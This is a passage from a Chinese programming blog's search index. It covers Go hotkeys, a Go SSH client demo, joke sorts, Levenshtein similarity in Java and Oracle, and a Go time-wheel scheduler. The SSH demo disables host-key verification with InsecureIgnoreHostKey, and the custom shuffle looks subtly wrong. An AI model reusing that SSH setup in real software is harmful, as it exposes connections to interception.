fsModifiers, hotKey.KeyCode)\t\t\t\t// 退出热键\t\t\t\tif id == 1 &#123;\t\t\t\t\tbreak\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;\t&#125;&#125;// 注册单个热键func (h *HotKey) registerOneHotKey() &#123;\tres, _, err := registerHotKey.Call(0, uintptr(h.Id), uintptr(h.Modifiers), uintptr(h.KeyCode))\tif res == 0 &#123;\t\tfmt.Println(&quot;注册热键失败：&quot;, h, &quot;error&quot;, err)\t&#125; else &#123;\t\tfmt.Println(&quot;注册热键成功：&quot;, h)\t&#125;&#125;// 注销单个热键func (h *HotKey) unregisterOneHotKey() &#123;\tres, _, err := unregisterHotKey.Call(0, uintptr(h.Id))\tif res == 0 &#123;\t\tfmt.Println(&quot;注销热键失败：&quot;, h, &quot;error&quot;, err)\t&#125; else &#123;\t\tfmt.Println(&quot;注销热键成功：&quot;, h)\t&#125;&#125;\n\n运行结果\n注册热键成功： &amp;&#123;1 1 90&#125;注册热键成功： &amp;&#123;2 5 88&#125;注册热键成功： &amp;&#123;3 3 67&#125;&amp;&#123;2 5 88&#125;热键值: alt shift+X&amp;&#123;3 3 67&#125;热键值: alt ctrl+C&amp;&#123;1 1 90&#125;热键值: alt+Z注销热键成功： &amp;&#123;1 1 90&#125;注销热键成功： &amp;&#123;2 5 88&#125;注销热键成功： &amp;&#123;3 3 67&#125;进程 已完成，退出代码为 0\n\n更多函数（api）参考微软文档 Win32 API 的编程参考。\n关于 sshwails 虽然有缺点，但是也只能用了。毕竟 GUI 框架没上面可以选。因为只能单窗口，所以想做类似 utools 的工具集就不太可能了。毕竟理想来说每个工具都是一个窗口。其次就是前后台切换运行时，焦点的处理。wails的窗口没有句柄（wails官网博客-v3路线中说的），不能与窗口进行交互。所以要使用它提供的运行时 api，不过 api 有点少。最后还有个开机自启动的功能。还没研究过，不过有人在 issue 里提了，估计是没法实现。\n所以工具集就算了，只能换个想做的的东西了。（当然也没做成最后想到的是 ssh 客户端。因为我现在用的是 WinSCP 和 PuTTY 集成使用的方案，上古 UI ，并且不是那么方便。（其实也还好，都是 shell 操作。\n没做成是因为它有些难，关于 io 流 和 异步。虽然 go 有优势，但我还不太熟。异步的问题在 windows api 做热键的时候就有了，不过问题还不是那么大。到 ssh 这，肯定要多终端连接。代码是一点都写不下去输出的 io 流我暂时也没办法输出到 wails 的窗口上。所以就没做成。\n不过有示例，输出到控制台倒是没问题。\npackage mainimport (\t&quot;fmt&quot;\t&quot;golang.org/x/crypto/ssh&quot;\t&quot;golang.org/x/term&quot;\t&quot;log&quot;\t&quot;os&quot;)func main() &#123;\tvar (\t\tusername = &quot;root&quot;\t\tpassword = &quot;password&quot;\t\taddr     = &quot;ip:port&quot;\t)\tconfig := &amp;ssh.ClientConfig&#123;\t\tUser: username,\t\tAuth: []ssh.AuthMethod&#123;\t\t\tssh.Password(password),\t\t&#125;,\t\tHostKeyCallback: ssh.InsecureIgnoreHostKey(),\t&#125;\tconn, err := ssh.Dial(&quot;tcp&quot;, addr, config)\tif err != nil &#123;\t\tlog.Fatal(&quot;连接失败: &quot;, err)\t&#125;\tdefer func(conn *ssh.Client) &#123;\t\terr := conn.Close()\t\tif err != nil &#123;\t\t\tfmt.Println(err)\t\t\treturn\t\t&#125;\t&#125;(conn)\t// 创建会话\tsession, err := conn.NewSession()\tif err != nil &#123;\t\tlog.Fatal(&quot;无法创建会话: &quot;, err)\t&#125;\tdefer func(session *ssh.Session) &#123;\t\terr := session.Close()\t\tif err != nil &#123;\t\t\tfmt.Println(err)\t\t\treturn\t\t&#125;\t&#125;(session)\t// file, _ := os.OpenFile(&quot;./resources/a.txt&quot;, os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0600)\t// 设置会话的标准输出、错误输出、标准输入\tsession.Stdout = os.Stdout\tsession.Stderr = os.Stderr\tsession.Stdin = os.Stdin\t// 设置终端参数\tmodes := ssh.TerminalModes&#123;\t\tssh.ECHO:          1,     // 启用回显\t\tssh.TTY_OP_ISPEED: 14400, // input speed = 14.4kb\t\tssh.TTY_OP_OSPEED: 14400, // output speed = 14.4kb\t&#125;\t// 获取当前标准输出终端窗口尺寸 该操作可能有的平台上不可用，那么下面手动指定终端尺寸即可\ttermWidth, termHeight, err := term.GetSize(int(os.Stdout.Fd()))\tif err != nil &#123;\t\tlog.Fatal(&quot;无法获取终端大小: &quot;, err)\t&#125;\t// 设置虚拟终端与远程会话关联\tif err := session.RequestPty(&quot;xterm&quot;, termHeight, termWidth, modes); err != nil &#123;\t\tlog.Fatal(&quot;请求虚拟终端失败: &quot;, err)\t&#125;\t// 启动远程Shell\tif err := session.Shell(); err != nil &#123;\t\tlog.Fatal(&quot;启动shell失败: &quot;, err)\t&#125;\t// 阻塞直至结束会话\tif err := session.Wait(); err != nil &#123;\t\tlog.Fatal(&quot;退出异常: &quot;, err)\t&#125;&#125;\n\n运行结果\nLast login: Thu Aug 10 14:40:10 2023 from 58.221.220.122[root@VM-16-9-centos ~]# pwdpwd/root[root@VM-16-9-centos ~]# [root@VM-16-9-centos ~]# cd notecd note[root@VM-16-9-centos note]# [root@VM-16-9-centos note]# lllltotal 229992drwxr-xr-x 4 root root      4096 Jul 20 19:01 dist      drwxr-xr-x 9 root root      4096 Jul 20 16:28 jdk-17.0.8-rwxr-xr-x 1 root root 182376116 Jun 16 02:47 jdk-17_linux-x64_bin.tar.gz-rwxr-xr-x 1 root root  26556781 Jul 21 09:27 privateNote-0.0.1-SNAPSHOT.jar-rw-r--r-- 1 root root  26556825 Jul 22 21:33 privateNote.jar[root@VM-16-9-centos note]#[root@VM-16-9-centos note]# exitexitlogoutEOF进程 已完成，退出代码为 0\n\nEND得去深入学习下 io 流 和 多线程桌面应用就这样吧，主要 wails v2 版本功能还是太少了。等 v3 正式版再来用 go 玩玩桌面应用。\n最后放一个知乎的问题吧(现在整个 Web 前端是「屎山」吗？)[https://www.zhihu.com/question/511853234/answer/2324956267]\n不能说 web 吧，我觉得几乎所有的都是。\n","categories":["编程记录"],"tags":["golang","桌面应用","Windows Api","ssh"]},{"title":"猴子排序","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E7%8C%B4%E5%AD%90%E6%8E%92%E5%BA%8F/","content":"前言首先得介绍一下无限猴子定理，这个定理是来自埃米尔·博雷尔一本1909年出版谈概率的书籍，当中介绍了“打字的猴子”的概念。\n猴子定理定义如下：\n\n一般关于此定理的叙述为：有无限只猴子用无限的时间会产生特定的文章。其他取代的叙述，可能是用大英图书馆或美国国会图书馆取代法国国家图书馆；另一个常见的版本是英语使用者常用的，就是猴子会打出莎士比亚的著作。欧洲大陆还有一种说法版是猴子打出大英百科全书。在《从一到无穷大》中，作者则引用了哈姆雷特的例子。\n\n详细推导过程参考百度百科那么根据猴子定理，如果我们不断随机打乱一个可排序的数组，在无限长的时间里，这个数组肯定会变成有序数组。\n代码package org.example;import java.util.ArrayList;import java.util.Collections;import java.util.Scanner;public class MonkeySort &#123;    public static void main(String[] args) &#123;        Scanner scanner = new Scanner(System.in);        ArrayList&lt;Integer&gt; nums = new ArrayList&lt;&gt;();        for (int i = 0; i &lt; 5; i++) &#123;            nums.add(scanner.nextInt());        &#125;        //排序        monkeySort(nums);        //输出有序数组        for (Integer num : nums) &#123;            System.out.println(num);        &#125;    &#125;    private static void monkeySort(ArrayList&lt;Integer&gt; nums) &#123;        while (!checkSort(nums)) &#123;            upset3(nums);        &#125;    &#125;    /*     * 随机打乱传入的集合     * 洗牌算法     */    /**暴力     * 每次将原集合中随机一个元素，放到新集合中，然后删除原集合中这个元素。     */    private static void upset1(ArrayList&lt;Integer&gt; nums) &#123;        ArrayList&lt;Integer&gt; arr = (ArrayList&lt;Integer&gt;) nums.clone();        int length = arr.size();        nums.clear();        for (int i = 0; i &lt; length; i++) &#123;            int j = (int) (Math.random() * arr.size());            nums.add(arr.get(j));            arr.remove(j);        &#125;    &#125;    /**Fisher-Yates 洗牌算法     * 是对暴力算法的优化     * 我们可以不删除那个元素，而是将它和需打乱集合中最后一个元素交换位置     * 第一次将交换完，将前n-1个作为新地需要打乱的集合，最后1个元素作为乱序后的结果     * 第二次将交换完，将前n-2个作为新地需要打乱的集合，倒数两个元素作为乱序后的结果     * ...     * 直至集合全为乱序。     */    private static void upset2(ArrayList&lt;Integer&gt; nums) &#123;        for (int i = nums.size() - 1; i &gt;= 0; i--) &#123;            int j = (int) (Math.random() * (i));            nums.add(j, nums.get(i));            nums.remove(i + 1);            nums.add(nums.get(j + 1));            nums.remove(j + 1);        &#125;    &#125;    //使用shuffle()方法    private static void upset3(ArrayList&lt;Integer&gt; nums) &#123;        Collections.shuffle(nums);    &#125;    /**     * 判断集合是否有序     */    private static boolean checkSort(ArrayList&lt;Integer&gt; nums) &#123;        for (int i = 0; i &lt; nums.size() - 1; i++) &#123;            if (nums.get(i) &gt; nums.get(i + 1)) return false;        &#125;        return true;    &#125;&#125;\n总结猴子排序，看运气的算法。\n","categories":["编程记录"],"tags":["java","算法","排序"]},{"title":"睡觉排序","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E7%9D%A1%E8%A7%89%E6%8E%92%E5%BA%8F/","content":"前言在网上看到了这个算法，觉得很是厉害。能想出这种算法的多半是个人才，所以记录下，也算是分享。写程序，要拓宽思路。\n代码import java.util.Scanner;public class SleepSort implements Runnable &#123;    private final int num;    public SleepSort(int num) &#123;        this.num = num;    &#125;    public static void main(String[] args) &#123;        Scanner scanner = new Scanner(System.in);        int[] nums = new int[10];        for (int i = 0; i &lt; 10; i++) &#123;            nums[i] = scanner.nextInt();        &#125;        //排序        for (int j : nums) &#123;            new Thread(new SleepSort(j)).start();        &#125;    &#125;    @Override    public void run() &#123;        try &#123;            Thread.sleep(num * 100);//乘100防止num值过小出错，不过nums中值相近时，还是容易出错。            System.out.println(num);        &#125; catch (InterruptedException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\n后记叹为观止的算法！ 时间复杂度为O(max(input))\n","categories":["编程记录"],"tags":["java","算法","排序"]},{"title":"2021年年终总结","url":"/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/2021%E5%B9%B4%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/","content":"关于转专业2021年结束，也是转到这个奇奇怪怪的专业正好一年。光看课表，现在上的还是基础课，丝毫没有学到实际能用得上的东西。往后看，越看越像是计科和大数据的结合体（顺带一提，我们学校这专业挂了计科的名）。下学期十一门课，五天除了周三每天都是满课，估计不会再像这学期这么悠闲，还在这写什么总结了（也算不上总结，只能说随便写的纪录，人总会忘记不重要的事，对吧）。感觉自己每次做选择时都是那么随意，无论是高考填志愿，还是转专业，（原来想转软件工程来着），还是后来老师让我加实验室，还有选大创项目，都好随便。以至于现在也不知道自己在干嘛。算是选了自己想去的大方向，但小方向就不管了？不知道。\n关于学习学习嘛，除了正常上课。主要大学，大不了自学，还是给项目做的网站吧。从给到这个任务，放了一学期的羊之后，也终于在期中之后开始真正去做了，其实是因为项目中期答辩，项目组五个人，一个是商院拉过来凑数的，还有组长他负责做项目核心的系统，我负责网站，还有俩不知道干嘛。前两天算是把登陆注册写完了，我把前端的任务交给了另一个人，因为他报了蓝桥杯的web组，或许做得比我好呢，不是我不想做。还有两周期末了，考完试，寒假得把网站全做好了，毕竟下学期每天都满课，估计没啥时间做别的了，另外就是学算法，准备蓝桥杯的比赛了。其他的没什么了，一直学嘛，想学什么都试试呗，以后或许就没机会尝试了。\n其他其他就没什么了，大三暑假争取找个实习吧，考研就不是很想考了，毕竟日语忘的没啥了，而且没什么可以选择的，（或许吧，谁知道呢）希望以后能在这摸鱼吧。拜拜，2021，除了疫情其他都挺好的。\n2022回顾这篇是2022写总结后补的，补发的。毕竟那时候还没有博客。是写在摸鱼派的，所以时间上就写摸鱼派记录的时间吧。原文地址，有啥想评论的，可以在那发（包括其他）。\n回顾嘛，也没什么好回顾的。项目黄了，蓝桥杯也没多大成果。除了一直在学（也不知道学的咋样），其他的也没干成。引用摸鱼派的评论吧好好珍惜这段时光吧，还有一年半，毕竟：\n\n谁的青春不迷茫~\n\n","categories":["记录生活"],"tags":["记录生活"]},{"title":"计算字符串相似度","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E8%AE%A1%E7%AE%97%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B8%E4%BC%BC%E5%BA%A6/","content":"Start今天有个需求中需要定时同步数据，同步的判断条件是某个字段的相似度要大于 80%于是有了下面这篇文章。\n为了方便同步脚本的编写，提供了 Oracle 的函数版本，以便在sql中调用。\nLevenshtein距离首先介绍下 Levenshtein 距离（编辑距离）\n莱文斯坦距离（英语：Levenshtein distance）是编辑距离的一种。指两个字串之间，由一个转成另一个所需的最少编辑操作次数。\n允许的编辑操作包括：\n\n将一个字符替换成另一个字符\n插入一个字符\n删除一个字符\n\n俄罗斯科学家弗拉基米尔·莱文斯坦在1965年提出这个概念。\n下面是它的数学定义\n\n字符串相似度的实现java 全矩阵迭代（动态规划） 实现public static float getSimilarityRatio(String str, String target) &#123;    int temp; // 记录相同字符，在某个矩阵位置值的增量。相同为0，不同为1    if (str.isEmpty() || target.isEmpty()) &#123;        return 0;    &#125;    // 初始化矩阵    int[][] d = new int[str.length() + 1][target.length() + 1];    for (int i = 0; i &lt;= str.length(); i++) &#123; // 初始化第一列        d[i][0] = i;    &#125;    for (int j = 0; j &lt;= target.length(); j++) &#123; // 初始化第一行        d[0][j] = j;    &#125;    // 动态规划填充矩阵    for (int i = 1; i &lt;= str.length(); i++) &#123;        char ch1 = str.charAt(i - 1);        for (int j = 1; j &lt;= target.length(); j++) &#123;            char ch2 = target.charAt(j - 1);            if (ch1 == ch2) &#123;                temp = 0;            &#125; else &#123;                temp = 1;            &#125;            d[i][j] = Math.min(Math.min(d[i - 1][j] + 1, d[i][j - 1] + 1), d[i - 1][j - 1] + temp);        &#125;    &#125;    // 计算相似度 1 - (Levenshtein 距离 / 两字符串最大长度) * 100%    return (1 - (float) d[str.length()][target.length()] / Math.max(str.length(), target.length())) * 100F;&#125;\n\n\n\noracle 函数 全矩阵迭代 实现-- 创建临时表，用于存储矩阵（过程值）CREATE GLOBAL TEMPORARY TABLE similarity_matrix(    id1   NUMBER,    id2   NUMBER,    value NUMBER) ON COMMIT DELETE ROWS;-- 创建函数 计算字符串相似度CREATE OR REPLACE FUNCTION func_get_similarity_ratio(str VARCHAR2, target VARCHAR2) RETURN NUMBER DETERMINISTIC IS    -- 使用自治事务    pragma autonomous_transaction;    n     NUMBER := LENGTH(str);    m     NUMBER := LENGTH(target);    i     NUMBER;    j     NUMBER;    temp  NUMBER;    d_val NUMBER;    ch1   VARCHAR2(1);    ch2   VARCHAR2(1);BEGIN    IF n = 0 OR m = 0 THEN        RETURN 0;    END IF;    -- 初始化矩阵的第一列    FOR i IN 0..n        LOOP            INSERT INTO similarity_matrix(id1, id2, value) VALUES (i, 0, i);        END LOOP;    -- 初始化矩阵的第一行    FOR j IN 0..m        LOOP            INSERT INTO similarity_matrix(id1, id2, value) VALUES (0, j, j);        END LOOP;    -- 动态规划填充矩阵    FOR i IN 1..n        LOOP            FOR j IN 1..m                LOOP                    ch1 := SUBSTR(str, i, 1);                    ch2 := SUBSTR(target, j, 1);                    IF ch1 = ch2 THEN                        temp := 0;                    ELSE                        temp := 1;                    END IF;                    -- 获取三者中的最小值                    SELECT MIN(value)                    INTO d_val                    FROM (SELECT value + 1 as value FROM similarity_matrix WHERE id1 = i - 1   AND id2 = j union                          SELECT value + 1 as value FROM similarity_matrix WHERE id1 = i   AND id2 = j - 1 union                          SELECT value + temp as value FROM similarity_matrix WHERE id1 = i - 1 AND id2 = j - 1);                    -- 更新当前格子的值                    INSERT INTO similarity_matrix(id1, id2, value) VALUES (i, j, d_val);                END LOOP;        END LOOP;    SELECT value into d_val FROM similarity_matrix WHERE id1 = n AND id2 = m;    commit;    -- 计算并返回相似度    RETURN (1 - round(d_val / GREATEST(n, m), 4)) * 100;END func_get_similarity_ratio;-- 调用函数测试select func_get_similarity_ratio(&#x27;12345a&#x27;, &#x27;12345A&#x27;) as ratiofrom dual;\n\njava 递归实现递归返回 Levenshtein 距离，相似度可按照 1 - (Levenshtein 距离 / 两字符串最大长度) * 100% 公式计算。\npublic static int getSimilarityRatio(String str, int strLength, String target, int targetLength) &#123;    // 递归回归点    if (strLength == 0)        return targetLength;    if (targetLength == 0)        return strLength;    int cos;    if (str.charAt(strLength - 1) == target.charAt(targetLength - 1))        cos = 0;    else        cos = 1;    int re1 = getSimilarityRatio(str, strLength - 1, target, targetLength) + 1;    int re2 = getSimilarityRatio(str, strLength, target, targetLength - 1) + 1;    int re3 = getSimilarityRatio(str, strLength - 1, target, targetLength - 1) + cos;    // 三个中的最小值    return re1 &lt; re2 ? (Math.min(re1, re3)) : (Math.min(re2, re3));&#125;\n\n2024-10-09 fix: 添加对中文字符的支持create FUNCTION func_get_similarity_ratio(str VARCHAR2, target VARCHAR2) RETURN NUMBER DETERMINISTIC IS    PRAGMA AUTONOMOUS_TRANSACTION;    n     NUMBER := LENGTH(str);    m     NUMBER := LENGTH(target);    i     NUMBER;    j     NUMBER;    temp  NUMBER;    d_val NUMBER;    ch1   VARCHAR2(1 CHAR);    ch2   VARCHAR2(1 CHAR);BEGIN    IF n = 0 OR m = 0 THEN        RETURN 0;    END IF;    -- 初始化矩阵的第一列    FOR i IN 0..n        LOOP            INSERT INTO similarity_matrix(id1, id2, value) VALUES (i, 0, i);        END LOOP;    -- 初始化矩阵的第一行    FOR j IN 0..m        LOOP            INSERT INTO similarity_matrix(id1, id2, value) VALUES (0, j, j);        END LOOP;    -- 动态规划填充矩阵    FOR i IN 1..n        LOOP            FOR j IN 1..m                LOOP                    ch1 := SUBSTR(str, i, 1);                    ch2 := SUBSTR(target, j, 1);                    IF ch1 = ch2 THEN                        temp := 0;                    ELSE                        temp := 1;                    END IF;                    -- 定义变量存储左、上、左上角的值                    SELECT MIN(value)                    INTO d_val                    FROM (SELECT value + 1 as value FROM similarity_matrix WHERE id1 = i - 1   AND id2 = j union                          SELECT value + 1 as value FROM similarity_matrix WHERE id1 = i   AND id2 = j - 1 union                          SELECT value + temp as value FROM similarity_matrix WHERE id1 = i - 1 AND id2 = j - 1);                    -- 更新当前格子的值                    INSERT INTO similarity_matrix(id1, id2, value) VALUES (i, j, d_val);                END LOOP;        END LOOP;    SELECT value INTO d_val FROM similarity_matrix WHERE id1 = n AND id2 = m;    COMMIT;    -- 计算并返回相似度    RETURN (1 - d_val / GREATEST(n, m)) * 100;END func_get_similarity_ratio;\n\nEnd这种基于矩阵迭代的算法，时间复杂度和空间复杂度都是 O(m * n) 。其中，m 是第一个字符串的长度，n 是第二个字符串的长度。对于长字符串效率可能会较低。\n","categories":["编程记录"],"tags":["java","字符串","算法","sql","编辑距离"]},{"title":"时间轮","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E6%97%B6%E9%97%B4%E8%BD%AE/","content":"介绍时间轮（Timing Wheel）是一种高效的时间管理数据结构，广泛应用于网络协议、操作系统、定时任务调度等领域。时间轮的核心思想是将时间划分为多个“槽”（slot），每个槽对应一个时间单位，并通过指针的旋转来管理定时任务。\n时间轮的两种设计时间轮由多个时间槽组成，每个时间槽对应一个时间单位（如1毫秒、1秒等），是它所支持的最小粒度。时间轮的核心是一个环形数组，数组的每个元素代表一个时间槽。时间轮有一个指针，指向当前的时间槽，随着时间的推进，指针会顺时针移动，类似于钟表的指针。\n\n初始化：时间轮初始化时，所有时间槽为空。\n添加任务：当需要添加一个定时任务时，系统会根据任务的延迟时间计算出它应该被放置在哪个时间槽中。例如，如果当前指针指向第 n 个槽，任务的延迟时间为 t，每个槽的时间单位为 Δt，则任务应被放置在 (n + t / Δt) % N 个槽中（其中 N 是时间轮的总槽数）。\n指针移动：每隔一个时间单位（如1毫秒），指针向前移动一个槽。\n任务执行：当指针到达某个槽时，该槽中的所有任务都会被执行。\n\n为了支持更长的定时任务，有两个拓展时间轮的设计。多层时间轮和记录圈数的时间轮。\n多层时间轮模仿了现实世界中的时钟结构：秒针、分针、时针分别代表不同层级的时间单位。每一层时间轮负责一个时间单位（如秒、分、小时），低层时间轮每完成一圈，上层时间轮前进一格。\n例如：第一层：每个槽代表1秒，共60槽（代表1分钟）第二层：每个槽代表1分钟，共60槽（代表1小时）第三层：每个槽代表1小时，共24槽（代表1天）\n每隔一个时间单位（如1秒），最底层时间轮指针移动如果最底层完成一圈，第二层移动一格如果第二层完成一圈，第三层移动一格每当最底层的指针移动到某个槽时，执行该槽中的所有任务。当其他层的指针移动到某个槽时，将该槽中的任务加入下一层的时间轮。高层轮的任务只是“占位符”，真正的执行在最底层（秒轮）进行。\n例如一个任务在 1小时2分钟3秒后执行。当前时间为21:30:02，任务在22:32:05执行。\n\n\n\n层级\n槽号\n说明\n\n\n\n时轮\n22\n1小时后触发，触发后将任务推进到分轮\n\n\n分轮\n32\n32分钟后触发，触发后将任务推进到秒轮\n\n\n秒轮\n5\n5秒后执行最终任务\n\n\n它支持非常长延时的任务，并且内存占用较低，时间复杂度为O(1)。但实现复杂，需要处理多级时间轮联动。\n记录圈数的时间轮在每个槽中不仅记录任务，还记录该任务需要等待的圈数（round）。指针每移动一圈，所有任务的圈数减一，当圈数为零时执行任务。\n它是一个固定大小的时间轮（如32或64个槽）。每个槽是一个任务列表，每个任务额外记录圈数。\n每次指针移动一个槽遍历当前槽中所有任务：如果任务的round &gt; 0，round -&#x3D; 1，如果 round &#x3D;&#x3D; 0，执行任务\n它的结构简单易于实现，支持较长的延迟，时间复杂度也为O(1)。但它每次移动指针时需要遍历当前槽中的所有任务。\n实现这里实现记录圈数方式的时间轮。\npackage timewheelimport (\t&quot;container/list&quot;\t&quot;errors&quot;\t&quot;github.com/orcaman/concurrent-map/v2&quot;\t&quot;github.com/panjf2000/ants/v2&quot;\t&quot;github.com/sirupsen/logrus&quot;\t&quot;runtime/debug&quot;\t&quot;time&quot;)// TimeWheel 核心结构体type TimeWheel struct &#123;\tinterval          time.Duration // 时间轮的精度\tslots             []*list.List  // 时间轮每个位置存储的Task列表\tticker            *time.Ticker  // 时间轮的计时器\tcurrentPos        int           // 时间轮当前的位置\tslotNums          int           // 时间轮的齿轮数 interval*slotNums就是时间轮转一圈走过的时间\taddTaskChannel    chan *Task\tremoveTaskChannel chan *Task\tstopChannel       chan bool\ttaskRecords       cmap.ConcurrentMap[string, *list.Element] // Map结构来存储Task对象，key是Task.key，value是Task在双向链表中的存储对象list.Element\tisRunning         bool\tpool              *ants.Pool // 协程池&#125;// Job 需要执行的Job的函数结构体type Job func(task *Task)// Task 时间轮上需要执行的任务type Task struct &#123;\tKey         string        // 用来标识task对象，是唯一的\tInterval    time.Duration // 任务周期\tTimes       int           // 任务需要执行的次数，如果需要一直执行，设置成-1\tJob         Job           // 任务需要执行的Job\tcreatedTime time.Time     // 任务的创建时间\tpos         int           // 任务在轮的位置\tcircle      int           // 任务需要在轮走多少圈才能执行&#125;// ErrDuplicateTaskKey is an definedError for duplicate task keyvar ErrDuplicateTaskKey = errors.New(&quot;duplicate task key&quot;)// ErrTaskKeyNotFount is an definedError when task key is not foundvar ErrTaskKeyNotFount = errors.New(&quot;task key doesn&#x27;t existed in task list, please check your input&quot;)// NewTimeWheel 初始化一个TimeWheel对象func NewTimeWheel(interval time.Duration, slotNums int) *TimeWheel &#123;\tif interval &lt;= 0 || slotNums &lt;= 0 &#123;\t\treturn nil\t&#125;\tpool, err := ants.NewPool(\t\t16,\t\tants.WithPreAlloc(true),\t\tants.WithNonblocking(true),\t)\tif err != nil &#123;\t\tlogrus.Errorf(&quot;init [timewhell] ants pool failed: %v&quot;, err)\t&#125;\ttw := &amp;TimeWheel&#123;\t\tinterval:          interval,\t\tslots:             make([]*list.List, slotNums),\t\tcurrentPos:        0,\t\tslotNums:          slotNums,\t\taddTaskChannel:    make(chan *Task, 16),\t\tremoveTaskChannel: make(chan *Task, 16),\t\tstopChannel:       make(chan bool),\t\ttaskRecords:       cmap.New[*list.Element](),\t\tisRunning:         false,\t\tpool:              pool,\t&#125;\ttw.initSlots()\treturn tw&#125;// Start 启动时间轮func (tw *TimeWheel) Start() &#123;\ttw.ticker = time.NewTicker(tw.interval)\tgo func(tw *TimeWheel) &#123;\t\tfor &#123;\t\t\tselect &#123;\t\t\tcase &lt;-tw.ticker.C:\t\t\t\ttw.checkAndRunTask()\t\t\tcase task := &lt;-tw.addTaskChannel:\t\t\t\ttw.addTask(task, false)\t\t\tcase task := &lt;-tw.removeTaskChannel:\t\t\t\ttw.removeTask(task)\t\t\tcase &lt;-tw.stopChannel:\t\t\t\ttw.ticker.Stop()\t\t\t\treturn\t\t\t&#125;\t\t&#125;\t&#125;(tw)\ttw.isRunning = true&#125;// Stop 关闭时间轮func (tw *TimeWheel) Stop() &#123;\ttw.stopChannel &lt;- true\ttw.isRunning = false\ttw.pool.Release()&#125;// IsRunning 检查全局时间轮是否在正常运行func (tw *TimeWheel) IsRunning() bool &#123;\treturn tw.isRunning&#125;// Exist 检查任务是否存在func (tw *TimeWheel) Exist(key string) bool &#123;\t_, ok := tw.taskRecords.Get(key)\treturn ok&#125;// GetTaskTimes 获取任务剩余执行次数func (tw *TimeWheel) GetTaskTimes(key string) int &#123;\tt, ok := tw.taskRecords.Get(key)\tif !ok &#123;\t\treturn 0\t&#125;\treturn t.Value.(*Task).Times&#125;// AddTask 向时间轮添加固定周期任务func (tw *TimeWheel) AddTask(task *Task) error &#123;\tif task.Interval &lt;= 0 || task.Key == &quot;&quot; &#123;\t\treturn errors.New(&quot;invalid task params&quot;)\t&#125;\t// 检查Task.Key是否已经存在\t_, ok := tw.taskRecords.Get(task.Key)\tif ok &#123;\t\treturn ErrDuplicateTaskKey\t&#125;\ttask.createdTime = time.Now()\ttw.addTaskChannel &lt;- task\treturn nil&#125;// RemoveTask 从时间轮删除任务func (tw *TimeWheel) RemoveTask(key string) error &#123;\tif key == &quot;&quot; &#123;\t\treturn nil\t&#125;\t// 检查该Task是否存在\tval, ok := tw.taskRecords.Get(key)\tif !ok &#123;\t\treturn ErrTaskKeyNotFount\t&#125;\ttask := val.Value.(*Task)\ttw.removeTaskChannel &lt;- task\treturn nil&#125;// 初始化时间轮，每个轮上的卡槽用一个双向队列表示，便于插入和删除func (tw *TimeWheel) initSlots() &#123;\tfor i := 0; i &lt; tw.slotNums; i++ &#123;\t\ttw.slots[i] = list.New()\t&#125;&#125;// 检查该轮点位上的Task，看哪个需要执行func (tw *TimeWheel) checkAndRunTask() &#123;\t// 获取该轮位置的双向链表\tcurrentList := tw.slots[tw.currentPos]\tif currentList != nil &#123;\t\tfor item := currentList.Front(); item != nil; &#123;\t\t\ttask, ok := item.Value.(*Task)\t\t\tif !ok &#123;\t\t\t\titem = item.Next()\t\t\t\tcontinue\t\t\t&#125;\t\t\tnext := item.Next()\t\t\tif task.circle &gt; 0 &#123;\t\t\t\ttask.circle--\t\t\t&#125; else &#123;\t\t\t\tif task.Job != nil &#123;\t\t\t\t\t// 使用协程池执行任务\t\t\t\t\terr := tw.pool.Submit(func() &#123;\t\t\t\t\t\tdefer func() &#123;\t\t\t\t\t\t\tif err := recover(); err != nil &#123;\t\t\t\t\t\t\t\tstack := debug.Stack()\t\t\t\t\t\t\t\tlogrus.Errorf(&quot;task %v panic: %v %s\\n&quot;, task.Key, err, string(stack))\t\t\t\t\t\t\t&#125;\t\t\t\t\t\t&#125;()\t\t\t\t\t\ttask.Job(task)\t\t\t\t\t&#125;)\t\t\t\t\tif err != nil &#123;\t\t\t\t\t\tlogrus.Errorf(&quot;task %v submit failed: %v\\n&quot;, task.Key, err)\t\t\t\t\t&#125;\t\t\t\t&#125; else &#123;\t\t\t\t\tlogrus.Warnf(&quot;The task %s don&#x27;t have job to run\\n&quot;, task.Key)\t\t\t\t&#125;\t\t\t\ttw.taskRecords.Remove(task.Key)\t\t\t\tcurrentList.Remove(item)\t\t\t\tif task.Times &lt; 0 &#123;\t\t\t\t\ttw.addTask(task, true) // 无限次，继续添加\t\t\t\t&#125; else if task.Times &gt; 1 &#123;\t\t\t\t\ttask.Times--\t\t\t\t\ttw.addTask(task, true) // 剩余次数大于1，继续添加\t\t\t\t&#125;\t\t\t&#125;\t\t\titem = next\t\t&#125;\t&#125;\t// 轮前进一步\ttw.currentPos = (tw.currentPos + 1) % tw.slotNums&#125;// 添加任务的内部函数func (tw *TimeWheel) addTask(task *Task, byInterval bool) &#123;\tvar pos, circle int\t// 使用任务周期或创建时间生成\tif byInterval &#123;\t\tpos, circle = tw.getPosAndCircleByInterval(task.Interval)\t&#125; else &#123;\t\tpos, circle = tw.getPosAndCircleByCreatedTime(task.createdTime, task.Interval)\t&#125;\ttask.circle = circle\ttask.pos = pos\telement := tw.slots[pos].PushBack(task)\ttw.taskRecords.Set(task.Key, element)&#125;// 删除任务的内部函数func (tw *TimeWheel) removeTask(task *Task) &#123;\tval, ok := tw.taskRecords.Get(task.Key)\tif !ok &#123;\t\treturn\t&#125;\ttw.taskRecords.Remove(task.Key)\tif t, ok := val.Value.(*Task); ok &amp;&amp; t.pos &lt; tw.slotNums &#123;\t\ttw.slots[t.pos].Remove(val)\t&#125;&#125;// 该函数通过任务的周期来计算下次执行的位置和圈数func (tw *TimeWheel) 